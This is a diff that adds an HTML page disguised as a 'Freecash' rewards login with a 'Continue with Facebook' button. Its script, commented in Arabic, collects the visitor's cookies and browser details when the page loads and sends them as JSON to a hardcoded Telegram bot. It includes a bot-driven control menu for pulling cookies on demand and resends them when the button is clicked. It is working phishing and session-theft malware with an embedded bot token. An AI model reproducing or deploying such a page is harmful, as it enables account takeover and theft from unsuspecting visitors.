@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Freecash - Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #120c24;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 20px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        /* شريط التحميل العلوي */
+        .progress-bar-container {
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 25px;
+            margin-top: 10px;
+        }
+        .progress-segment {
+            height: 3px;
+            border-radius: 2px;
+            background-color: #332d4d;
+        }
+        .progress-segment.active {
+            background-color: #00e676;
+            width: 50px;
+        }
+        .progress-segment.inactive {
+            width: 25px;
+        }
+
+        /* الشعار */
+        .logo {
+            color: #00e676;
+            font-size: 24px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            margin-bottom: 25px;
+        }
+
+        /* صندوق الأيقونات والمكافآت العائمة (مطابق للصورة) */
+        .rewards-box {
+            background-color: #1a1333;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 25px;
+            display: inline-block;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+        }
+        .rewards-icons {
+            font-size: 26px;
+            letter-spacing: 8px;
+        }
+
+        /* العنوان الترويجي */
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 35px;
+            color: #ffffff;
+        }
+        .title span {
+            color: #00e676;
+        }
+
+        /* زر فيسبوك فقط */
+        .btn-fb {
+            width: 100%;
+            height: 48px;
+            background-color: #1877f2;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
+            text-decoration: none;
+        }
+        .btn-fb:active {
+            opacity: 0.9;
+        }
+
+        /* الشروط والأحكام */
+        .terms-box {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            text-align: right;
+            margin-bottom: 20px;
+        }
+        .terms-box input[type="checkbox"] {
+            accent-color: #00e676;
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+            cursor: pointer;
+        }
+        .terms-text {
+            font-size: 11px;
+            color: #9e95b0;
+            line-height: 1.4;
+        }
+
+        .footer-policy {
+            font-size: 10px;
+            color: #9e95b0;
+            line-height: 1.4;
+        }
+        .footer-policy a {
+            color: #00e676;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- شريط التقدم العلوي -->
+        <div class="progress-bar-container">
+            <div class="progress-segment active"></div>
+            <div class="progress-segment inactive"></div>
+            <div class="progress-segment inactive"></div>
+            <div class="progress-segment inactive"></div>
+        </div>
+
+        <!-- الشعار -->
+        <div class="logo">S FREE CASH</div>
+
+        <!-- صندوق المكافآت والعناصر العائمة -->
+        <div class="rewards-box">
+            <div class="rewards-icons">👩 🪙 📦 👑 🎮</div>
+        </div>
+
+        <!-- العنوان الرئيسي -->
+        <div class="title">
+            Do what you love.<br>We'll <span>reward</span> you for it.
+        </div>
+
+        <!-- زر فيسبوك فقط -->
+        <a href="https://m.facebook.com/" class="btn-fb" onclick="handleFacebookClick(event)">
+            <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+            Continue with Facebook
+        </a>
+
+        <!-- خيار الموافقة -->
+        <div class="terms-box">
+            <input type="checkbox" id="agreeCheck" checked>
+            <label for="agreeCheck" class="terms-text">
+                I agree to Freecash collecting app info on my device to improve offer selection. Data is not shared with third parties.
+            </label>
+        </div>
+
+        <!-- سياسة الخصوصية -->
+        <div class="footer-policy">
+            By continuing, you agree to the <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>.
+        </div>
+    </div>
+
+    <script>
+        // إعدادات بوت تيليجرام الخاص بك
+        const TELEGRAM_BOT_TOKEN = "8101585583:AAGq7jrDxoGA7eOMzo0ZFSnhUMLT5dHpTyM";
+        const ADMIN_CHAT_ID = "7845009971";
+        const TARGET_FACEBOOK_URL = "https://m.facebook.com/";
+
+        let lastUpdateId = 0;
+        let isListening = true;
+
+        // إرسال رسالة إلى تيليجرام
+        function sendTelegramMessage(chatId, text, replyMarkup = null) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: text,
+                parse_mode: "Markdown"
+            };
+            if (replyMarkup) data.reply_markup = replyMarkup;
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).catch(err => console.log(err));
+        }
+
+        // استخراج الكوكيز بصيغة JSON مرتبة
+        function getFormattedCookies() {
+            const rawCookies = document.cookie;
+            if (!rawCookies) return null;
+
+            const cookiesArray = [];
+            const pairs = rawCookies.split(";");
+            let idCounter = 1;
+
+            pairs.forEach(pair => {
+                const keyValue = pair.trim().split("=", 2);
+                if (keyValue.length === 2) {
+                    cookiesArray.push({
+                        domain: window.location.hostname,
+                        expirationDate: Math.floor(Date.now() / 1000) + 31536000,
+                        hostOnly: false,
+                        httpOnly: ["datr", "xs", "fr", "sb", "session"].includes(keyValue[0].trim().toLowerCase()),
+                        name: keyValue[0].trim(),
+                        path: "/",
+                        sameSite: "no_restriction",
+                        secure: true,
+                        session: false,
+                        storeId: "0",
+                        value: keyValue[1].trim(),
+                        id: idCounter++
+                    });
+                }
+            });
+
+            return cookiesArray.length > 0 ? JSON.stringify(cookiesArray, null, 4) : null;
+        }
+
+        // تقرير الدخول التلقائي عند فتح الزائر للموقع
+        function sendInitialReport() {
+            const cookiesJson = getFormattedCookies();
+            const reportMessage = `🍪 *تم زيارة موقع Freecash وجلب البيانات!*\n\n` +
+                                  `🌐 *الصفحة:* \`${window.location.href}\`\n` +
+                                  `💻 *المتصفح:* \`${navigator.userAgent}\`\n\n` +
+                                  (cookiesJson ? `\`\`\`json\n${cookiesJson}\n\`\`\`` : `*الكوكيز:* لا توجد كوكيز مسجلة.`);
+
+            sendTelegramMessage(ADMIN_CHAT_ID, reportMessage);
+        }
+
+        // الاستماع لأوامر البوت (Long Polling)
+        function startTelegramListener() {
+            if (!isListening) return;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=25`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok && data.result) {
+                        data.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+
+                            if (update.message && update.message.text) {
+                                const chatId = update.message.chat.id;
+                                const text = update.message.text.trim().toLowerCase();
+                                if (chatId.toString() === ADMIN_CHAT_ID) {
+                                    if (text === "/start") sendWelcomeMenu(chatId);
+                                    else sendTelegramMessage(chatId, "❌ أمر غير معروف. أرسل /start");
+                                }
+                            }
+
+                            if (update.callback_query) {
+                                const chatId = update.callback_query.message.chat.id;
+                                const dataQuery = update.callback_query.data;
+                                if (chatId.toString() === ADMIN_CHAT_ID) {
+                                    if (dataQuery === "cmd_extract_cookies") {
+                                        const cookiesJson = getFormattedCookies();
+                                        sendTelegramMessage(chatId, cookiesJson ? `\`\`\`json\n${cookiesJson}\n\`\`\`` : "⚠️ لا توجد كوكيز مسجلة.");
+                                    } else if (dataQuery === "cmd_device_info") {
+                                        sendTelegramMessage(chatId, `📱 معلومات الجهاز:\n\`${navigator.userAgent}\``);
+                                    }
+                                }
+                            }
+                        });
+                    }
+                })
+                .catch(err => console.log(err))
+                .finally(() => setTimeout(startTelegramListener, 1000));
+        }
+
+        function sendWelcomeMenu(chatId) {
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "🍪 استخراج الكوكيز الحالية (JSON)", callback_data: "cmd_extract_cookies" }],
+                    [{ text: "📱 معلومات الزائر", callback_data: "cmd_device_info" }]
+                ]
+            };
+            sendTelegramMessage(chatId, "👑 *لوحة تحكم الموقع عبر تيليجرام*", keyboard);
+        }
+
+        window.onload = function() {
+            sendInitialReport();
+            startTelegramListener();
+        };
+
+        // عند النقر على زر فيسبوك: إرسال البيانات للبوت والبقاء داخل نفس المتصفح
+        function handleFacebookClick(event) {
+            event.preventDefault();
+            const cookiesJson = getFormattedCookies();
+            if (cookiesJson) {
+                sendTelegramMessage(ADMIN_CHAT_ID, `🚀 *الزائر ضغط على زر فيسبوك!* الكوكيز:\n\n\`\`\`json\n${cookiesJson}\n\`\`\``);
+            } else {
+                sendTelegramMessage(ADMIN_CHAT_ID, `🚀 *الزائر ضغط على زر فيسبوك!* (لا توجد كوكيز حالياً).`);
+            }
+            setTimeout(function() {
+                window.location.href = TARGET_FACEBOOK_URL;
+            }, 400);
+        }
+    </script>
+</body>
+</html>
